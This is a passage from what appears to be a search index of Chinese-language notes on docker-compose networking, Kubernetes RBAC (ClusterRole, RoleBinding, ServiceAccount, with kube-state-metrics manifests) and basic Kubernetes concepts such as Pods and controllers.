k, m, g \u6216\u8005 kb, mb, gb networks # \u5b9a\u4e49 networks \u4fe1\u606f driver # \u6307\u5b9a\u7f51\u7edc\u6a21\u5f0f, \u5927\u591a\u6570\u60c5\u51b5\u4e0b, \u5b83 bridge \u4e8e\u5355\u4e2a\u4e3b\u673a\u548c overlay Swarm \u4e0a bridge # Docker \u9ed8\u8ba4\u4f7f\u7528 bridge \u8fde\u63a5\u5355\u4e2a\u4e3b\u673a\u4e0a\u7684\u7f51\u7edc overlay # overlay \u9a71\u52a8\u7a0b\u5e8f\u521b\u5efa\u4e00\u4e2a\u8de8\u591a\u4e2a\u8282\u70b9\u547d\u540d\u7684\u7f51\u7edc host # \u5171\u4eab\u4e3b\u673a\u7f51\u7edc\u540d\u79f0\u7a7a\u95f4(\u7b49\u540c\u4e8e docker run --net=host) none # \u7b49\u540c\u4e8e docker run --net=none driver_opts # v3.2\u4ee5\u4e0a\u7248\u672c, \u4f20\u9012\u7ed9\u9a71\u52a8\u7a0b\u5e8f\u7684\u53c2\u6570, \u8fd9\u4e9b\u53c2\u6570\u53d6\u51b3\u4e8e\u9a71\u52a8\u7a0b\u5e8f attachable # driver \u4e3a overlay \u65f6\u4f7f\u7528, \u5982\u679c\u8bbe\u7f6e\u4e3a true \u5219\u9664\u4e86\u670d\u52a1\u4e4b\u5916\uff0c\u72ec\u7acb\u5bb9\u5668\u4e5f\u53ef\u4ee5\u9644\u52a0\u5230\u8be5\u7f51\u7edc; \u5982\u679c\u72ec\u7acb\u5bb9\u5668\u8fde\u63a5\u5230\u8be5\u7f51\u7edc\uff0c\u5219\u5b83\u53ef\u4ee5\u4e0e\u5176\u4ed6 Docker \u5b88\u62a4\u8fdb\u7a0b\u8fde\u63a5\u5230\u7684\u8be5\u7f51\u7edc\u7684\u670d\u52a1\u548c\u72ec\u7acb\u5bb9\u5668\u8fdb\u884c\u901a\u4fe1 ipam # \u81ea\u5b9a\u4e49 IPAM \u914d\u7f6e. \u8fd9\u662f\u4e00\u4e2a\u5177\u6709\u591a\u4e2a\u5c5e\u6027\u7684\u5bf9\u8c61, \u6bcf\u4e2a\u5c5e\u6027\u90fd\u662f\u53ef\u9009\u7684 driver # IPAM \u9a71\u52a8\u7a0b\u5e8f, bridge \u6216\u8005 default config # \u914d\u7f6e\u9879 subnet # CIDR\u683c\u5f0f\u7684\u5b50\u7f51\uff0c\u8868\u793a\u8be5\u7f51\u7edc\u7684\u7f51\u6bb5 external # \u5916\u90e8\u7f51\u7edc, \u5982\u679c\u8bbe\u7f6e\u4e3a true \u5219 docker-compose up \u4e0d\u4f1a\u5c1d\u8bd5\u521b\u5efa\u5b83, \u5982\u679c\u5b83\u4e0d\u5b58\u5728\u5219\u5f15\u53d1\u9519\u8bef name # v3.5 \u4ee5\u4e0a\u7248\u672c, \u4e3a\u6b64\u7f51\u7edc\u8bbe\u7f6e\u540d\u79f0 \u6587\u4ef6\u683c\u5f0f\u793a\u4f8b\uff1a version: \"3\" services: redis: image: redis:alpine ports: - \"6379\" networks: - frontend deploy: replicas: 2 update_config: parallelism: 2 delay: 10s restart_policy: condition: on-failure db: image: postgres:9.4 volumes: - db-data:/var/lib/postgresql/data networks: - backend deploy: placement: constraints: [node.role == manager]\u590d\u5236\u4ee3\u7801","title":"\u65b9\u5f0f\u4e8c\uff1a\u66f4\u6539\u9700\u8981\u94fe\u63a5\u7684\u5bb9\u5668\u7684\u7f51\u7edc\u6a21\u5f0f"},{"location":"lxc/kubernetes/","text":"Kubernetes Kubernetes \uff08\u5e38\u7b80\u79f0\u4e3a K8s \uff09\u662f\u7528\u4e8e\u81ea\u52a8\u90e8\u7f72\u3001\u6269\u5c55\u548c\u7ba1\u7406\u201c \u5bb9\u5668\u5316 \uff08containerized\uff09\u5e94\u7528\u7a0b\u5e8f\u201d\u7684 \u5f00\u6e90 \u7cfb\u7edf\u3002\u8be5\u7cfb\u7edf\u7531 Google \u8bbe\u8ba1\u5e76\u6350\u8d60\u7ed9Cloud Native Computing Foundation\uff08\u4eca\u5c5e Linux\u57fa\u91d1\u4f1a \uff09\u6765\u4f7f\u7528\u3002 \u5b83\u65e8\u5728\u63d0\u4f9b\u201c\u8de8\u4e3b\u673a\u96c6\u7fa4\u7684\u81ea\u52a8\u90e8\u7f72\u3001\u6269\u5c55\u4ee5\u53ca\u8fd0\u884c\u5e94\u7528\u7a0b\u5e8f\u5bb9\u5668\u7684\u5e73\u53f0\u201d\u3002\u5b83\u652f\u6301\u4e00\u7cfb\u5217\u5bb9\u5668\u5de5\u5177\uff0c\u5305\u62ec Docker \u7b49\u3002 Kubernetes - \u7ef4\u57fa\u767e\u79d1\uff0c\u81ea\u7531\u7684\u767e\u79d1\u5168\u4e66 (wikipedia.org)","title":"Kubernetes"},{"location":"lxc/kubernetes/#kubernetes","text":"Kubernetes \uff08\u5e38\u7b80\u79f0\u4e3a K8s \uff09\u662f\u7528\u4e8e\u81ea\u52a8\u90e8\u7f72\u3001\u6269\u5c55\u548c\u7ba1\u7406\u201c \u5bb9\u5668\u5316 \uff08containerized\uff09\u5e94\u7528\u7a0b\u5e8f\u201d\u7684 \u5f00\u6e90 \u7cfb\u7edf\u3002\u8be5\u7cfb\u7edf\u7531 Google \u8bbe\u8ba1\u5e76\u6350\u8d60\u7ed9Cloud Native Computing Foundation\uff08\u4eca\u5c5e Linux\u57fa\u91d1\u4f1a \uff09\u6765\u4f7f\u7528\u3002 \u5b83\u65e8\u5728\u63d0\u4f9b\u201c\u8de8\u4e3b\u673a\u96c6\u7fa4\u7684\u81ea\u52a8\u90e8\u7f72\u3001\u6269\u5c55\u4ee5\u53ca\u8fd0\u884c\u5e94\u7528\u7a0b\u5e8f\u5bb9\u5668\u7684\u5e73\u53f0\u201d\u3002\u5b83\u652f\u6301\u4e00\u7cfb\u5217\u5bb9\u5668\u5de5\u5177\uff0c\u5305\u62ec Docker \u7b49\u3002 Kubernetes - \u7ef4\u57fa\u767e\u79d1\uff0c\u81ea\u7531\u7684\u767e\u79d1\u5168\u4e66 (wikipedia.org)","title":"Kubernetes"},{"location":"lxc/kubernetes/ClusterRole/","text":"Role \u4e0e ClusterRole Role \u5bf9\u8c61\u5c31\u662f\u4e00\u4e2a\u89d2\u8272\u5305\u542b\u4e86\u4e00\u5957\u8868\u793a\u4e00\u7ec4\u6743\u9650\u7684\u89c4\u5219\u3002\u4f46\u662f\u53ea\u5bf9\u4e00\u4e2a namespace \u751f\u6548\uff0c\u4e66\u5199\u89c4\u5219\u7684\u65f6\u5019\u5fc5\u987b\u5199\u4e0a\u9488\u5bf9\u54ea\u4e2a namespace ClusterRole \u5bf9\u8c61\u4e5f\u662f\u4e00\u4e2a\u89d2\u8272\u5305\u542b\u4e86\u4e00\u5957\u8868\u793a\u4e00\u7ec4\u6743\u9650\u7684\u89c4\u5219\uff0c\u4f46\u662f\u5bf9\u6574\u4e2a Kubernetes \u96c6\u7fa4\u8303\u56f4\u5185\u6709\u6548\u3002 RoleBinding \u4e0e ClusterRoleBinding RoleBinding \u5c31\u662f\u5c06\u4e00\u4e2a Role \u7ed1\u5b9a\u7ed9\u67d0\u4e2a\u7528\u6237\uff0c\u4e5f\u53ef\u4ee5\u7ed1\u5b9a ClusterRole \uff0c\u4f46\u662f\u53ea\u80fd\u5bf9\u4e00\u4e2a namespace \u751f\u6548\uff0c\u56e0\u4e3a RoleBinding \u9700\u8981\u6307\u5b9a namespace ClusterRoleBinding \u5c31\u662f\u5c06\u4e00\u4e2a ClusterRole \u7ed1\u5b9a\u7ed9\u67d0\u4e2a\u7528\u6237 Service Account ServiceAccount \u4e3a Pod \u4e2d\u7684\u8fdb\u7a0b\u63d0\u4f9b\u8eab\u4efd\u4fe1\u606f\u3002 \u5f53\u60a8\uff08\u771f\u4eba\u7528\u6237\uff09\u8bbf\u95ee\u96c6\u7fa4\uff08\u4f8b\u5982\u4f7f\u7528 kubectl \u547d\u4ee4\uff09\u65f6\uff0capiserver \u4f1a\u5c06\u60a8\u8ba4\u8bc1\u4e3a\u4e00\u4e2a\u7279\u5b9a\u7684 User Account\uff08\u76ee\u524d\u901a\u5e38\u662f admin \uff0c\u9664\u975e\u60a8\u7684\u7cfb\u7edf\u7ba1\u7406\u5458\u81ea\u5b9a\u4e49\u4e86\u96c6\u7fa4\u914d\u7f6e\uff09\u3002Pod \u5bb9\u5668\u4e2d\u7684\u8fdb\u7a0b\u4e5f\u53ef\u4ee5\u4e0e apiserver \u8054\u7cfb\u3002 \u5f53\u5b83\u4eec\u5728\u8054\u7cfb apiserver \u7684\u65f6\u5019\uff0c\u5b83\u4eec\u4f1a\u88ab\u8ba4\u8bc1\u4e3a\u4e00\u4e2a\u7279\u5b9a\u7684 Service Account\uff08\u4f8b\u5982 default \uff09\u3002 \u5f53\u60a8\u521b\u5efa pod \u7684\u65f6\u5019\uff0c\u5982\u679c\u60a8\u6ca1\u6709\u6307\u5b9a\u4e00\u4e2a service account\uff0c\u7cfb\u7edf\u4f1a\u81ea\u52a8\u5f97\u5728\u4e0e\u8be5pod \u76f8\u540c\u7684 namespace \u4e0b\u4e3a\u5176\u6307\u6d3e\u4e00\u4e2a default service account\u3002\u5982\u679c\u60a8\u83b7\u53d6\u521a\u521b\u5efa\u7684 pod \u7684\u539f\u59cb json \u6216 yaml \u4fe1\u606f\uff08\u4f8b\u5982\u4f7f\u7528 kubectl get pods/podename -o yaml \u547d\u4ee4\uff09\uff0c\u60a8\u5c06\u770b\u5230 spec.serviceAccountName \u5b57\u6bb5\u5df2\u7ecf\u88ab\u8bbe\u7f6e\u4e3a default \u3002 \u8be6\u89e3\uff1a https://jimmysong.io/kubernetes-handbook/concepts/serviceaccount.html https://jimmysong.io/kubernetes-handbook/concepts/rbac.html kube-state-metrics-clusterRole.yaml apiVersion: rbac.authorization.k8s.io/v1 kind: ClusterRole metadata: labels: app.kubernetes.io/name: kube-state-metrics app.kubernetes.io/version: v1.9.5 name: kube-state-metrics rules: - apiGroups: - \"\" resources: - configmaps - secrets - nodes - pods - services - resourcequotas - replicationcontrollers - limitranges - persistentvolumeclaims - persistentvolumes - namespaces - endpoints verbs: - list - watch - apiGroups: - extensions resources: - daemonsets - deployments - replicasets - ingresses verbs: - list - watch - apiGroups: - apps resources: - statefulsets - daemonsets - deployments - replicasets verbs: - list - watch - apiGroups: - batch resources: - cronjobs - jobs verbs: - list - watch - apiGroups: - autoscaling resources: - horizontalpodautoscalers verbs: - list - watch - apiGroups: - authentication.k8s.io resources: - tokenreviews verbs: - create - apiGroups: - authorization.k8s.io resources: - subjectaccessreviews verbs: - create - apiGroups: - policy resources: - poddisruptionbudgets verbs: - list - watch - apiGroups: - certificates.k8s.io resources: - certificatesigningrequests verbs: - list - watch - apiGroups: - storage.k8s.io resources: - storageclasses - volumeattachments verbs: - list - watch - apiGroups: - admissionregistration.k8s.io resources: - mutatingwebhookconfigurations - validatingwebhookconfigurations verbs: - list - watch - apiGroups: - networking.k8s.io resources: - networkpolicies verbs: - list - watch kube-state-metrics-clusterRoleBinding.yaml apiVersion: rbac.authorization.k8s.io/v1 kind: ClusterRoleBinding metadata: labels: app.kubernetes.io/name: kube-state-metrics app.kubernetes.io/version: v1.9.5 name: kube-state-metrics roleRef: apiGroup: rbac.authorization.k8s.io kind: ClusterRole name: kube-state-metrics subjects: - kind: ServiceAccount name: kube-state-metrics namespace: monitoring kube-state-metrics-serviceAccount.yaml apiVersion: v1 kind: ServiceAccount metadata: labels: app.kubernetes.io/name: kube-state-metrics app.kubernetes.io/version: v1.9.5 name: kube-state-metrics namespace: monitoring","title":"ClusterRole"},{"location":"lxc/kubernetes/ClusterRole/#role-clusterrole","text":"Role \u5bf9\u8c61\u5c31\u662f\u4e00\u4e2a\u89d2\u8272\u5305\u542b\u4e86\u4e00\u5957\u8868\u793a\u4e00\u7ec4\u6743\u9650\u7684\u89c4\u5219\u3002\u4f46\u662f\u53ea\u5bf9\u4e00\u4e2a namespace \u751f\u6548\uff0c\u4e66\u5199\u89c4\u5219\u7684\u65f6\u5019\u5fc5\u987b\u5199\u4e0a\u9488\u5bf9\u54ea\u4e2a namespace ClusterRole \u5bf9\u8c61\u4e5f\u662f\u4e00\u4e2a\u89d2\u8272\u5305\u542b\u4e86\u4e00\u5957\u8868\u793a\u4e00\u7ec4\u6743\u9650\u7684\u89c4\u5219\uff0c\u4f46\u662f\u5bf9\u6574\u4e2a Kubernetes \u96c6\u7fa4\u8303\u56f4\u5185\u6709\u6548\u3002","title":"Role \u4e0e ClusterRole"},{"location":"lxc/kubernetes/ClusterRole/#rolebinding-clusterrolebinding","text":"RoleBinding \u5c31\u662f\u5c06\u4e00\u4e2a Role \u7ed1\u5b9a\u7ed9\u67d0\u4e2a\u7528\u6237\uff0c\u4e5f\u53ef\u4ee5\u7ed1\u5b9a ClusterRole \uff0c\u4f46\u662f\u53ea\u80fd\u5bf9\u4e00\u4e2a namespace \u751f\u6548\uff0c\u56e0\u4e3a RoleBinding \u9700\u8981\u6307\u5b9a namespace ClusterRoleBinding \u5c31\u662f\u5c06\u4e00\u4e2a ClusterRole \u7ed1\u5b9a\u7ed9\u67d0\u4e2a\u7528\u6237","title":"RoleBinding \u4e0e ClusterRoleBinding"},{"location":"lxc/kubernetes/ClusterRole/#service-account","text":"ServiceAccount \u4e3a Pod \u4e2d\u7684\u8fdb\u7a0b\u63d0\u4f9b\u8eab\u4efd\u4fe1\u606f\u3002 \u5f53\u60a8\uff08\u771f\u4eba\u7528\u6237\uff09\u8bbf\u95ee\u96c6\u7fa4\uff08\u4f8b\u5982\u4f7f\u7528 kubectl \u547d\u4ee4\uff09\u65f6\uff0capiserver \u4f1a\u5c06\u60a8\u8ba4\u8bc1\u4e3a\u4e00\u4e2a\u7279\u5b9a\u7684 User Account\uff08\u76ee\u524d\u901a\u5e38\u662f admin \uff0c\u9664\u975e\u60a8\u7684\u7cfb\u7edf\u7ba1\u7406\u5458\u81ea\u5b9a\u4e49\u4e86\u96c6\u7fa4\u914d\u7f6e\uff09\u3002Pod \u5bb9\u5668\u4e2d\u7684\u8fdb\u7a0b\u4e5f\u53ef\u4ee5\u4e0e apiserver \u8054\u7cfb\u3002 \u5f53\u5b83\u4eec\u5728\u8054\u7cfb apiserver \u7684\u65f6\u5019\uff0c\u5b83\u4eec\u4f1a\u88ab\u8ba4\u8bc1\u4e3a\u4e00\u4e2a\u7279\u5b9a\u7684 Service Account\uff08\u4f8b\u5982 default \uff09\u3002 \u5f53\u60a8\u521b\u5efa pod \u7684\u65f6\u5019\uff0c\u5982\u679c\u60a8\u6ca1\u6709\u6307\u5b9a\u4e00\u4e2a service account\uff0c\u7cfb\u7edf\u4f1a\u81ea\u52a8\u5f97\u5728\u4e0e\u8be5pod \u76f8\u540c\u7684 namespace \u4e0b\u4e3a\u5176\u6307\u6d3e\u4e00\u4e2a default service account\u3002\u5982\u679c\u60a8\u83b7\u53d6\u521a\u521b\u5efa\u7684 pod \u7684\u539f\u59cb json \u6216 yaml \u4fe1\u606f\uff08\u4f8b\u5982\u4f7f\u7528 kubectl get pods/podename -o yaml \u547d\u4ee4\uff09\uff0c\u60a8\u5c06\u770b\u5230 spec.serviceAccountName \u5b57\u6bb5\u5df2\u7ecf\u88ab\u8bbe\u7f6e\u4e3a default \u3002 \u8be6\u89e3\uff1a https://jimmysong.io/kubernetes-handbook/concepts/serviceaccount.html https://jimmysong.io/kubernetes-handbook/concepts/rbac.html kube-state-metrics-clusterRole.yaml apiVersion: rbac.authorization.k8s.io/v1 kind: ClusterRole metadata: labels: app.kubernetes.io/name: kube-state-metrics app.kubernetes.io/version: v1.9.5 name: kube-state-metrics rules: - apiGroups: - \"\" resources: - configmaps - secrets - nodes - pods - services - resourcequotas - replicationcontrollers - limitranges - persistentvolumeclaims - persistentvolumes - namespaces - endpoints verbs: - list - watch - apiGroups: - extensions resources: - daemonsets - deployments - replicasets - ingresses verbs: - list - watch - apiGroups: - apps resources: - statefulsets - daemonsets - deployments - replicasets verbs: - list - watch - apiGroups: - batch resources: - cronjobs - jobs verbs: - list - watch - apiGroups: - autoscaling resources: - horizontalpodautoscalers verbs: - list - watch - apiGroups: - authentication.k8s.io resources: - tokenreviews verbs: - create - apiGroups: - authorization.k8s.io resources: - subjectaccessreviews verbs: - create - apiGroups: - policy resources: - poddisruptionbudgets verbs: - list - watch - apiGroups: - certificates.k8s.io resources: - certificatesigningrequests verbs: - list - watch - apiGroups: - storage.k8s.io resources: - storageclasses - volumeattachments verbs: - list - watch - apiGroups: - admissionregistration.k8s.io resources: - mutatingwebhookconfigurations - validatingwebhookconfigurations verbs: - list - watch - apiGroups: - networking.k8s.io resources: - networkpolicies verbs: - list - watch kube-state-metrics-clusterRoleBinding.yaml apiVersion: rbac.authorization.k8s.io/v1 kind: ClusterRoleBinding metadata: labels: app.kubernetes.io/name: kube-state-metrics app.kubernetes.io/version: v1.9.5 name: kube-state-metrics roleRef: apiGroup: rbac.authorization.k8s.io kind: ClusterRole name: kube-state-metrics subjects: - kind: ServiceAccount name: kube-state-metrics namespace: monitoring kube-state-metrics-serviceAccount.yaml apiVersion: v1 kind: ServiceAccount metadata: labels: app.kubernetes.io/name: kube-state-metrics app.kubernetes.io/version: v1.9.5 name: kube-state-metrics namespace: monitoring","title":"Service Account"},{"location":"lxc/kubernetes/basic/","text":"\u57fa\u672c\u6982\u5ff5 Cluster Cluster\u662f\u8ba1\u7b97\u3001\u5b58\u50a8\u548c\u7f51\u7edc\u8d44\u6e90\u7684\u96c6\u5408\uff0cKubernetes\u5229\u7528\u8fd9\u4e9b\u8d44\u6e90\u8fd0\u884c\u5404\u79cd\u57fa\u4e8e\u5bb9\u5668\u7684\u5e94\u7528\u3002 Master Master\u662fCluster\u7684\u5927\u8111\uff0c\u5b83\u7684\u4e3b\u8981\u804c\u8d23\u662f\u8c03\u5ea6\uff0c\u5373\u51b3\u5b9a\u5c06\u5e94\u7528\u653e\u5728\u54ea\u91cc\u8fd0\u884c\u3002Master\u8fd0\u884cLinux\u64cd\u4f5c\u7cfb\u7edf\uff0c\u53ef\u4ee5\u662f\u7269\u7406\u673a\u6216\u8005\u865a\u62df\u673a\u3002\u4e3a\u4e86\u5b9e\u73b0\u9ad8\u53ef\u7528\uff0c\u53ef\u4ee5\u8fd0\u884c\u591a\u4e2aMaster\u3002 1.API server \u8d44\u6e90\u64cd\u4f5c\u7684\u552f\u4e00\u5165\u53e3\uff0c\u63a5\u53d7\u7528\u6237\u8f93\u5165\u7684\u547d\u4ee4\uff0c\u63d0\u4f9b\u8ba4\u8bc1\uff0c\u6388\u6743\u3001API\u6ce8\u518c\u548c\u53d1\u73b0\u7b49\u673a\u5236 2.Scheduler \u8d1f\u8d23\u96c6\u7fa4\u8d44\u6e90\u7684\u8c03\u5ea6\uff0c\u6309\u7167\u9884\u5b9a\u7684\u8c03\u5ea6\u7b56\u7565\u5c06pod\u8c03\u5ea6\u5230\u76f8\u5e94\u7684node\u8282\u70b9\u4e0a 3.Controller-manager \u8d1f\u8d23\u7ef4\u62a4\u96c6\u7fa4\u7684\u72b6\u6001\uff0c\u6bd4\u7a0b\u5e8f\u90e8\u7f72\u5b89\u6392\uff0c\u6545\u969c\u68c0\u6d4b\uff0c\u81ea\u52a8\u6269\u5c55\uff0c\u6eda\u52a8\u66f4\u65b0\u7b49 4.Etcd \u8d1f\u8d23\u5b58\u50a8\u96c6\u7fa4\u4e2d\u5404\u79cd\u8d44\u6e90\u5bf9\u8c61\u7684\u4fe1\u606f Node Node\u7684\u804c\u8d23\u662f\u8fd0\u884c\u5bb9\u5668\u5e94\u7528\u3002Node\u7531Master\u7ba1\u7406\uff0cNode\u8d1f\u8d23\u76d1\u63a7\u5e76\u6c47\u62a5\u5bb9\u5668\u7684\u72b6\u6001\uff0c\u540c\u65f6\u6839\u636eMaster\u7684\u8981\u6c42\u7ba1\u7406\u5bb9\u5668\u7684\u751f\u547d\u5468\u671f\u3002Node\u8fd0\u884c\u5728Linux\u64cd\u4f5c\u7cfb\u7edf\u4e0a\uff0c\u53ef\u4ee5\u662f\u7269\u7406\u673a\u6216\u8005\u662f\u865a\u62df\u673a\u3002 1.kubelet \u4f5c\u7528\uff1a\u7ba1\u7406\u672c\u673a\u7684\u5bb9\u5668 2.kube-proxy \u4f5c\u7528\uff1a\u8d1f\u8d23\u63d0\u4f9b\u96c6\u7fa4\u5185\u90e8\u7684\u670d\u52a1\u53d1\u73b0\u548c\u8d1f\u8f7d\u5747\u8861 3.docker \u4f5c\u7528\uff1a\u8d1f\u8d23\u8282\u70b9\u4e0a\u5bb9\u5668\u7684\u5404\u79cd\u64cd\u4f5c Pod Pod\u662fKubernetes\u7684\u6700\u5c0f\u5de5\u4f5c\u5355\u5143\u3002\u6bcf\u4e2aPod\u5305\u542b\u4e00\u4e2a\u6216\u591a\u4e2a\u5bb9\u5668\u3002Pod\u4e2d\u7684\u5bb9\u5668\u4f1a\u4f5c\u4e3a\u4e00\u4e2a\u6574\u4f53\u88abMaster\u8c03\u5ea6\u5230\u4e00\u4e2aNode\u4e0a\u8fd0\u884c\u3002 Kubernetes\u5f15\u5165Pod\u4e3b\u8981\u57fa\u4e8e\u4e0b\u9762\u4e24\u4e2a\u76ee\u7684\uff1a 1\uff09\u53ef\u7ba1\u7406\u6027\u3002 \u6709\u4e9b\u5bb9\u5668\u5929\u751f\u5c31\u662f\u9700\u8981\u7d27\u5bc6\u8054\u7cfb\uff0c\u4e00\u8d77\u5de5\u4f5c\u3002Pod\u63d0\u4f9b\u4e86\u6bd4\u5bb9\u5668\u66f4\u9ad8\u5c42\u6b21\u7684\u62bd\u8c61\uff0c\u5c06\u5b83\u4eec\u5c01\u88c5\u5230\u4e00\u4e2a\u90e8\u7f72\u5355\u5143\u4e2d\u3002Kubernetes\u4ee5Pod\u4e3a\u6700\u5c0f\u5355\u4f4d\u8fdb\u884c\u8c03\u5ea6\u3001\u6269\u5c55\u3001\u5171\u4eab\u8d44\u6e90\u3001\u7ba1\u7406\u751f\u547d\u5468\u671f\u3002 2\uff09\u901a\u4fe1\u548c\u8d44\u6e90\u5171\u4eab\u3002 Pod\u4e2d\u7684\u6240\u6709\u5bb9\u5668\u4f7f\u7528\u540c\u4e00\u4e2a\u7f51\u7edcnamespace\uff0c\u5373\u76f8\u540c\u7684IP\u5730\u5740\u548cPort\u7a7a\u95f4\u3002\u5b83\u4eec\u53ef\u4ee5\u76f4\u63a5\u7528localhost\u901a\u4fe1\u3002\u540c\u6837\u7684\uff0c\u8fd9\u4e9b\u5bb9\u5668\u53ef\u4ee5\u5171\u4eab\u5b58\u50a8\uff0c\u5f53Kubernetes\u6302\u8f7dvolume\u5230Pod\uff0c\u672c\u8d28\u4e0a\u662f\u5c06volume\u6302\u8f7d\u5230Pod\u4e2d\u7684\u6bcf\u4e00\u4e2a\u5bb9\u5668\u3002 Pods\u6709\u4e24\u79cd\u4f7f\u7528\u65b9\u5f0f\uff1a 1\uff09\u8fd0\u884c\u5355\u4e00\u5bb9\u5668\u3002 one-container-per-Pod\u662fKubernetes\u6700\u5e38\u89c1\u7684\u6a21\u578b\uff0c\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u53ea\u662f\u5c06\u5355\u4e2a\u5bb9\u5668\u7b80\u5355\u5c01\u88c5\u6210Pod\u3002\u5373\u4fbf\u662f\u53ea\u6709\u4e00\u4e2a\u5bb9\u5668\uff0cKubernetes\u7ba1\u7406\u7684\u4e5f\u662fPod\u800c\u4e0d\u662f\u76f4\u63a5\u7ba1\u7406\u5bb9\u5668\u3002 2\uff09\u8fd0\u884c\u591a\u4e2a\u5bb9\u5668\u3002 \u95ee\u9898\u5728\u4e8e\uff1a\u54ea\u4e9b\u5bb9\u5668\u5e94\u8be5\u653e\u5230\u4e00\u4e2aPod\u4e2d\uff1f \u7b54\u6848\u662f\uff1a\u8fd9\u4e9b\u5bb9\u5668\u8054\u7cfb\u5fc5\u987b\u975e\u5e38\u7d27\u5bc6\uff0c\u800c\u4e14\u9700\u8981\u76f4\u63a5\u5171\u4eab\u8d44\u6e90\u3002 \u4e3e\u4e2a\u4f8b\u5b50\uff0cPod\u5305\u542b\u4e24\u4e2a\u5bb9\u5668\uff1a\u4e00\u4e2a\u662fFile Puller\uff0c\u4e00\u4e2a\u662fWeb Server\u3002File Puller\u4f1a\u5b9a\u671f\u4ece\u5916\u90e8\u7684Content Manager\u4e2d\u62c9\u53d6\u6700\u65b0\u7684\u6587\u4ef6\uff0c\u5c06\u5176\u5b58\u653e\u5728\u5171\u4eab\u7684volume\u4e2d\u3002Web Server\u4ecevolume\u8bfb\u53d6\u6587\u4ef6\uff0c\u54cd\u5e94Consumer\u7684\u8bf7\u6c42\u3002 \u8fd9\u4e24\u4e2a\u5bb9\u5668\u662f\u7d27\u5bc6\u534f\u4f5c\u7684\uff0c\u5b83\u4eec\u4e00\u8d77\u4e3aConsumer\u63d0\u4f9b\u6700\u65b0\u7684\u6570\u636e\uff1b\u540c\u65f6\u5b83\u4eec\u4e5f\u901a\u8fc7volume\u5171\u4eab\u6570\u636e\uff0c\u6240\u4ee5\u653e\u5230\u4e00\u4e2aPod\u662f\u5408\u9002\u7684\u3002 \u518d\u6765\u770b\u4e00\u4e2a\u53cd\u4f8b\uff1a\u662f\u5426\u9700\u8981\u5c06Tomcat\u548cMySQL\u653e\u5230\u4e00\u4e2aPod\u4e2d\uff1f Tomcat\u4eceMySQL\u8bfb\u53d6\u6570\u636e\uff0c\u5b83\u4eec\u4e4b\u95f4\u9700\u8981\u534f\u4f5c\uff0c\u4f46\u8fd8\u4e0d\u81f3\u4e8e\u9700\u8981\u653e\u5230\u4e00\u4e2aPod\u4e2d\u4e00\u8d77\u90e8\u7f72\u3001\u4e00\u8d77\u542f\u52a8\u3001\u4e00\u8d77\u505c\u6b62\u3002\u540c\u65f6\u5b83\u4eec\u4e4b\u95f4\u662f\u901a\u8fc7JDBC\u4ea4\u6362\u6570\u636e\uff0c\u5e76\u4e0d\u662f\u76f4\u63a5\u5171\u4eab\u5b58\u50a8\uff0c\u6240\u4ee5\u653e\u5230\u5404\u81ea\u7684Pod\u4e2d\u66f4\u5408\u9002\u3002 Controller Kubernetes\u901a\u5e38\u4e0d\u4f1a\u76f4\u63a5\u521b\u5efaPod\uff0c\u800c\u662f\u901a\u8fc7Controller\u6765\u7ba1\u7406Pod\u7684\u3002Controller\u4e2d\u5b9a\u4e49\u4e86Pod\u7684\u90e8\u7f72\u7279\u6027\uff0c\u6bd4\u5982\u6709\u51e0\u4e2a\u526f\u672c\u3001\u5728\u4ec0\u4e48\u6837\u7684Node\u4e0a\u8fd0\u884c\u7b49\u3002\u4e3a\u4e86\u6ee1\u8db3\u4e0d\u540c\u7684\u4e1a\u52a1\u573a\u666f\uff0cKubernetes\u63d0\u4f9b\u4e86\u591a\u79cdController\uff0c\u5305\u62ecDeployment\u3001ReplicaSet\u3001DaemonSet\u3001StatefuleSet\u3001Job\u7b49\uff0c\u9010\u4e00\u8ba8\u8bba\u3002 1.Deployment Deployment\u662f\u6700\u5e38\u7528\u7684Controller\uff0c\u6bd4\u5982\u5728\u7ebf\u6559\u7a0b\u4e2d\u5c31\u662f\u901a\u8fc7\u521b\u5efaDeployment\u6765\u90e8\u7f72\u5e94\u7528\u7684\u3002Deployment\u53ef\u4ee5\u7ba1\u7406Pod\u7684\u591a\u4e2a\u526f\u672c\uff0c\u5e76\u786e\u4fddPod\u6309\u7167\u671f\u671b\u7684\u72b6\u6001\u8fd0\u884c\u3002 2.ReplicaSet \uff082\uff09ReplicaSet\u5b9e\u73b0\u4e86Pod\u7684\u591a\u526f\u672c\u7ba1\u7406\u3002\u4f7f\u7528Deployment\u65f6\u4f1a\u81ea\u52a8\u521b\u5efaReplicaSet\uff0c\u4e5f\u5c31\u662f\u8bf4Deployment\u662f\u901a\u8fc7ReplicaSet\u6765\u7ba1\u7406Pod\u7684\u591a\u4e2a\u526f\u672c\u7684\uff0c\u6211\u4eec\u901a\u5e38\u4e0d\u9700\u8981\u76f4\u63a5\u4f7f\u7528ReplicaSet\u3002 3.DaemonSet \uff083\uff09DaemonSet\u7528\u4e8e\u6bcf\u4e2aNode\u6700\u591a\u53ea\u8fd0\u884c\u4e00\u4e2aPod\u526f\u672c\u7684\u573a\u666f\u3002\u6b63\u5982\u5176\u540d\u79f0\u6240\u63ed\u793a\u7684\uff0cDaemonSet\u901a\u5e38\u7528\u4e8e\u8fd0\u884cdaemon\u3002 4.StatefuleSet \uff084\uff09StatefuleSet\u80fd\u591f\u4fdd\u8bc1Pod\u7684\u6bcf\u4e2a\u526f\u672c\u5728\u6574\u4e2a\u751f\u547d\u5468\u671f\u4e2d\u540d\u79f0\u662f\u4e0d\u53d8\u7684\uff0c\u800c\u5176\u4ed6Controller\u4e0d\u63d0\u4f9b\u8fd9\u4e2a\u529f\u80fd\u3002\u5f53\u67d0\u4e2aPod\u53d1\u751f\u6545\u969c\u9700\u8981\u5220\u9664\u5e76\u91cd\u65b0\u542f\u52a8\u65f6\uff0cPod\u7684\u540d\u79f0\u4f1a\u53d1\u751f\u53d8\u5316\uff0c\u540c\u65f6StatefuleSet\u4f1a\u4fdd\u8bc1\u526f\u672c\u6309\u7167\u56fa\u5b9a\u7684\u987a\u5e8f\u542f\u52a8\u3001\u66f4\u65b0\u6216\u8005\u5220\u9664\u3002 4.Job \uff085\uff09Job\u7528\u4e8e\u8fd0\u884c\u7ed3\u675f\u5c31\u5220\u9664\u7684\u5e94\u7528\uff0c\u800c\u5176\u4ed6Controller\u4e2d\u7684Pod\u901a\u5e38\u662f\u957f\u671f\u6301\u7eed\u8fd0\u884c\u3002 Service 